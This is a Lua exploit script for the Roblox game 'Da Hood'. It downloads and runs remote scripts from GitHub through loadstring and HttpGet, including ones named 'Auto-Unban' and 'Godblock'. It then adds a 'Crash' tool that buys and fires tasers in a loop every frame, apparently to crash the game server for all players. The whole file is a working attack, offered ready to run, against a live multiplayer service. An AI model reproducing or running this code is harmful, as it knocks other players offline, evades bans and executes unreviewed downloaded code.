pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LEWISLEWISLEWISLEWISLEWIS/my-scripts/main/Da-Hood/Auto-Unban.lua"))()
end)

wait(7.5)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LEWISLEWISLEWISLEWISLEWIS/my-scripts/main/Da-Hood/Godblock.lua"))()
end)

wait(0.5)

game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Ignored.Shop["[Ninja Mask] - $60"].Head.CFrame
wait(0.5)
fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Ninja Mask] - $60"].ClickDetector)
wait(0.5)
game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Mask").Parent = game:GetService("Players").LocalPlayer.Character
wait(0.5)
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Mask"):Activate()
wait(0.5)
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Mask").Parent = game:GetService("Players").LocalPlayer.Backpack

Money = game:GetService("Players").LocalPlayer.DataFolder.Currency.Value
Tool = Instance.new("Tool", game:GetService("Players").LocalPlayer.Backpack)
Tool.Name = "Crash"
Tool.ToolTip = "Hold to buy tasers"

wait(0.5)

game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Crash").Parent = game:GetService("Players").LocalPlayer.Character
game:GetService("Players").LocalPlayer.PlayerGui.Framework.CurrencySound.Volume = 0

function Notification(text)
    game:GetService("StarterGui"):SetCore("SendNotification",{
        Title = "Da Hood",
        Text = text,
        Icon = "rbxassetid://0",
        Duration = 3,
    })
end

Notification("Crash by zefify/REVlENGE")

function Sound()
    for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
        if v:IsA("Tool") and v.Name == "[Taser]" then
            if v.Handle.Sound.Volume ~= 0 then
                v.Handle.Sound.Volume = 0
            end
        end
    end
end

game:GetService("RunService").Stepped:Connect(function()
    if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Crash") then
        HoldingCrash = true
    end
    if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Crash") then
        HoldingCrash = false
    end
    if HoldingCrash == true then
        if Money > 150000 then -- You're probably going to need atleast 150k (Faster version)
            game:GetService("ReplicatedStorage").MainEvent:FireServer("Block", true)
            wait()
            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Ignored.Shop["[Taser] - $1000"].Head.CFrame
            wait()
            game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(11)
            wait(1)
            fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Taser] - $1000"].ClickDetector)
            wait()
            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Taser]").Parent = game:GetService("Players").LocalPlayer.Character
            wait()
            Sound()
            wait()
            for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
                if v:IsA("Tool") and v.Name == "[Taser]" then
                    v:Activate()
                end
            end
        end
    end
    if HoldingCrash == true then
        if Money <= 150000 then -- You're probably going to need atleast 150k aswell but this version is going to take longer since you will have less tasers (Slower version)
            game:GetService("ReplicatedStorage").MainEvent:FireServer("Block", true)
            wait()
            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Ignored.Shop["[Taser] - $1000"].Head.CFrame
            wait()
            game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(11)
            wait()
            Sound()
            wait()
            for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
                if v:IsA("Tool") and v.Name == "[Taser]" then
                    v:Activate()
                end
            end
        end
    end
end)
